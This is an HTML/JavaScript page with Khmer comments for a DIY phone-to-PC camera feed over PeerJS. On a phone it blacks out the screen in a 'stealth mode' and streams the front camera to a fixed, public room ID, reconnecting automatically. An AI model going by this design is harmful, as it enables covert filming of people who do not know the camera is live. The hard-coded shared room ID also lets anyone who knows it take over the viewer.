<!DOCTYPE html>
<html lang="km">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ប្រព័ន្ធកាមេរ៉ាសុវត្ថិភាព ជំនាន់ទម្លុះប្រព័ន្ធពេញអេក្រង់</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        /* កំណត់ផ្ទៃខាងក្រោយខ្មៅងងឹត និងលុបគម្លាតចេញទាំងស្រុង */
        html, body { 
            margin: 0; 
            padding: 0; 
            width: 100%; 
            height: 100%; 
            background-color: #000000; 
            overflow: hidden; 
            font-family: sans-serif; 
        }

        /* កូដកំណត់វីដេអូឱ្យរត់ពេញអេក្រង់កុំព្យូទ័រស្អាត (Full Screen) */
        video { 
            width: 100%; 
            height: 100%; 
            object-fit: cover; 
            background: #000; 
            display: none; 
        }

        /* អក្សរបង្ហាញស្ថានភាពកណ្តាលអេក្រង់ */
        #status { 
            position: absolute; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%); 
            color: #2ac767; 
            font-weight: bold; 
            font-size: 22px; 
            text-align: center; 
            z-index: 10; 
            background: rgba(0, 0, 0, 0.7); 
            padding: 15px 25px; 
            border-radius: 8px; 
        }

        /* ស្ទីលពិសេសធ្វើឱ្យទូរសព្ទងងឹតឈឹងទាំងស្រុងមិនស៊ីថ្ម */
        .phone-stealth-mode { background: #000000 !important; }
        .phone-stealth-mode #pc-ui { display: none !important; }
    </style>
</head>
<body>

    <div id="pc-ui">
        <div id="status">📡 កំពុងរង់ចាំសញ្ញាភ្ជាប់ពីទូរសព្ទ...</div>
        <video id="view-video" autoplay playsinline muted></video>
    </div>

    <script>
        // ឈ្មោះបន្ទប់រួមរវាងកុំព្យូទ័រ និងទូរសព្ទ
        const LIVE_ROOM_ID = 'hino-security-camera-system-2026';
        
        // 🛠️ ប្រព័ន្ធបម្រុងទម្លុះ Firewall (STUN Servers របស់ Google) ជួយឱ្យរកគ្នាឃើញទោះប្រើអ៊ីនធឺណិតខុសគ្នា
        const peerConfig = {
            config: {
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' },
                    { urls: 'stun:stun2.l.google.com:19302' }
                ]
            }
        };
        
        let peer = null;
        let currentCall = null; 
        let localStream = null;

        window.onload = function() {
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

            if (!isMobile) {
                // បើបើកលើកុំព្យូទ័រ
                runAsPC();
            } else {
                // បើបើកលើទូរសព្ទ ឱ្យងងឹតឈឹងភ្លាមៗតែម្តង
                document.body.classList.add('phone-stealth-mode');
                startCamera();
            }
        };

        // --- ផ្នែកកុំព្យូទ័រ (អ្នកចាំមើល) ---
        function runAsPC() {
            if (peer) peer.destroy();
            peer = new Peer(LIVE_ROOM_ID, peerConfig);

            peer.on('call', (call) => {
                if (currentCall) {
                    call.answer();
                    setTimeout(() => { call.close(); }, 500);
                    return;
                }

                call.answer();
                currentCall = call; 
                
                // លាក់អក្សរស្ថានភាពចេញដើម្បីកុំឱ្យបាំងអេក្រង់
                document.getElementById('status').style.display = 'none';
                const video = document.getElementById('view-video');
                video.style.display = 'block';
                
                call.on('stream', (remoteStream) => {
                    video.srcObject = remoteStream;
                    
                    // បង្ខំឱ្យវីដេអូដំណើរការស្វ័យប្រវត្ត
                    video.play().catch(err => {
                        console.log("Autoplay blocked:", err);
                        // ករណីបើ Chrome នៅតែរឹងរូស ឱ្យអ្នកប្រើចុចលើអេក្រង់កុំព្យូទ័រ ១ដង
                        document.getElementById('status').style.display = 'block';
                        document.getElementById('status').style.color = '#ff3333';
                        document.getElementById('status').innerText = "🛑 សូមចុចលើអេក្រង់កុំព្យូទ័រ ១ដង ដើម្បីបើករូបភាព";
                        
                        document.body.onclick = () => {
                            video.play();
                            document.getElementById('status').style.display = 'none';
                        };
                    });
                });

                call.on('close', () => {
                    document.getElementById('status').style.display = 'block';
                    document.getElementById('status').style.color = '#2ac767';
                    document.getElementById('status').innerText = "📭 ទូរសព្ទបានដាច់ការភ្ជាប់។ រង់ចាំម្តងទៀត...";
                    video.style.display = 'none';
                    video.srcObject = null;
                    currentCall = null; 
                });
            });

            peer.on('error', (err) => {
                setTimeout(runAsPC, 2000);
            });
        }

        // --- ផ្នែកទូរសព្ទ (កាមេរ៉ាលាក់ខ្លួន) ---
        function startCamera() {
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            })
            .then((stream) => {
                localStream = stream;
                connectToPC();
            })
            .catch((err) => {
                console.error("មិនអាចបើកកាមេរ៉ាបានទេ៖", err);
            });
        }

        function connectToPC() {
            if (peer) peer.destroy();
            peer = new Peer(peerConfig); 

            peer.on('open', (id) => {
                const call = peer.call(LIVE_ROOM_ID, localStream);
                if (call) {
                    currentCall = call;
                    call.on('close', () => {
                        currentCall = null;
                        setTimeout(connectToPC, 3000); // បើដាច់ ឱ្យភ្ជាប់ឡើងវិញស្វ័យប្រវត្ត
                    });
                }
            });

            peer.on('error', (err) => {
                setTimeout(connectToPC, 4000);
            });
        }
    </script>
</body>
</html>
